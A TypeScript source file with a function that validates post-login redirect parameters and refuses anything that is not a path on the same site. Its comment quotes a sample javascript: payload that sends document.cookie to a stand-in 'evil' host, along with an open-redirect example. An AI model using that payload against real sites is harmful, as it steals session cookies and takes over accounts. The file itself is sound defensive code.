/**
 * Where to send someone after sign-in, from an untrusted `?redirect=` / `?next=`.
 *
 * Only a path on THIS site is accepted. Anything else falls back to "/" (which
 * routes by role). Without this, a link like
 *   /login?redirect=javascript:fetch('//evil/'+document.cookie)
 * ran the attacker's script the moment a real user finished signing in, and
 *   /login?redirect=https://evil.example
 * sent them to a look-alike site. `//host`, `/\host` and backslash/whitespace
 * tricks are browser-normalised into another origin, so they're refused too.
 */
export function safeRedirectPath(raw: string | null | undefined): string {
  if (!raw) return "/";
  let path = raw.trim();
  try {
    // Accept an already-encoded value once (the OAuth round trip encodes it).
    if (/%2f|%5c/i.test(path.slice(0, 6))) path = decodeURIComponent(path);
  } catch {
    return "/";
  }
  if (!path.startsWith("/")) return "/";
  // "//evil", "/\evil", "/\t/evil" … all become another origin in a browser.
  if (/^\/[\\/\s]/.test(path)) return "/";
  if (/[\u0000-\u001f\\]/.test(path)) return "/";
  // Final belt-and-braces: resolve against a dummy origin and insist it stayed.
  try {
    const u = new URL(path, "https://lmiros.invalid");
    if (u.origin !== "https://lmiros.invalid") return "/";
    return u.pathname + u.search + u.hash;
  } catch {
    return "/";
  }
}
